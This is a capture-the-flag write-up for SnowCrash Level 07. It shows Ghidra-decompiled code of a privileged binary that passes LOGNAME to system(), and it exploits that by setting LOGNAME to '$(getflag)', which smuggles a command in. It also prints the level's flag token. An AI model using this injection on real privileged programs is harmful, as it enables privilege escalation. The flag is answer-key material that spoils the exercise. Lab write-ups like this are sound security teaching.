# SnowCrash Level 07

## Introduction
Welcome to SnowCrash Level 07! In this level, we encountered an executable file and utilized Ghidra for analysis.

## Initial Exploration
Upon listing the files, we found an executable file. Using Ghidra, we analyzed the executable, revealing the following code snippet:
```
int main(int argc, char **argv, char **envp)
{
    char *pcVar1;
    int iVar2;
    char *buffer;
    gid_t gid;
    uid_t uid;
    char *local_1c;
    __gid_t local_18;
    __uid_t local_14;
  
    local_18 = getegid();
    local_14 = geteuid();
    setresgid(local_18, local_18, local_18);
    setresuid(local_14, local_14, local_14);
    local_1c = (char *)0x0;
    pcVar1 = getenv("LOGNAME");
    asprintf(&local_1c, "/bin/echo %s ", pcVar1);
    iVar2 = system(local_1c);
    return iVar2;
}
```
## Exploitation Approach
The crucial part of the code is:
```
pcVar1 = getenv("LOGNAME");
asprintf(&local_1c, "/bin/echo %s ", pcVar1);
iVar2 = system(local_1c);
```
We realized that by changing the value of the environment variable LOGNAME, we could control the command executed by the system() function.

## Exploiting with Environment Variable
We set the LOGNAME environment variable to '$(getflag)':
```
export LOGNAME='$(getflag)'
```
Then, when executing the program ./level07, it executed the command echo $(getflag) and provided us with the flag.

## Results
```
level07@SnowCrash:~$ ./level07
Check flag. Here is your token: fiumuikeil55xe9cu4dood66h
```
## Conclusion
By understanding the code and manipulating environment variables, we successfully exploited the program to obtain the flag.
